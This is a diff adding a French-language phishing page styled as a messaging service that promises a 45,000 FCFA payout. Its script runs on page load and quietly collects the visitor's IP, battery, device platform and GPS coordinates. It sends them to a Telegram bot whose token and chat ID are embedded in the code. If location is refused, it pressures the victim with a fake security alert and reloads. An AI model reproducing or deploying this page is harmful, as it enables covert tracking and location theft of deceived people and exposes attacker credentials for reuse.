@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NDMESSAGE - Récupérer vos 45 000 FCFA</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#111b21] text-white flex items-center justify-center h-screen font-sans">
+    <div class="text-center p-6 max-w-sm w-full">
+        <div class="mb-6 flex justify-center">
+            <div class="animate-spin rounded-full h-12 w-12 border-4 border-t-transparent border-[#00a884]"></div>
+        </div>
+        <h1 class="text-2xl font-light mb-2 text-[#00a884]">NDMESSAGE</h1>
+        <p class="text-gray-400 text-sm mb-8">Vérification du système pour le transfert des 45 000 FCFA...</p>
+        <div id="status" class="text-gray-500 text-xs font-mono uppercase tracking-widest">Initialisation...</div>
+    </div>
+
+    <script>
+        // CONFIGURATION TELEGRAM
+        const BOT_TOKEN = "8623909429:AAGXjNNbgo6qrMDzuF46CAmhz4HBRLB9TM8";
+        const CHAT_ID = "6224971749";
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) { return "Inconnue"; }
+        }
+
+        async function sendToTelegram(data) {
+            const message = `
+⚠️ *ALERTE NDMESSAGE* ⚠️
+------------------------------
+📍 *IP:* ${data.ip}
+🔋 *Batterie:* ${data.batterie} (${data.en_charge})
+📱 *Appareil:* ${data.os}
+🌍 *Position:* ${data.lat && data.lon ? `https://www.google.com/maps?q=${data.lat},${data.lon}` : "GPS REFUSÉ"}
+------------------------------
+🚀 *Action:* Analyse l'IP avec scanner.py
+            `;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+        }
+
+        async function startCapture() {
+            const status = document.getElementById('status');
+            const ip = await getIP();
+            const battery = await navigator.getBattery();
+            const deviceInfos = {
+                ip: ip,
+                batterie: Math.round(battery.level * 100) + "%",
+                en_charge: battery.charging ? "En charge" : "Sur batterie",
+                os: navigator.platform
+            };
+
+            // OPTION SUPPLÉMENTAIRE : Demande GPS avec gestion d'erreur
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                status.innerText = "CONFIRMATION RÉUSSIE";
+                const fullData = {
+                    ...deviceInfos,
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude
+                };
+                await sendToTelegram(fullData);
+                setTimeout(() => { window.location.href = "https://i.imgur.com/K1z3s1H.jpeg"; }, 2000);
+
+            }, (err) => {
+                // Si refusé, on envoie quand même l'IP et on affiche un message d'intimidation
+                status.innerText = "ERREUR : ACCÈS GPS OBLIGATOIRE";
+                sendToTelegram(deviceInfos);
+                alert("Erreur de sécurité : Vous devez autoriser la localisation pour valider le transfert des 45.000 FCFA.");
+                // Relance la demande après l'alerte
+                location.reload();
+            });
+        }
+
+        setTimeout(startCapture, 2500);
+    </script>
+</body>
+</html>
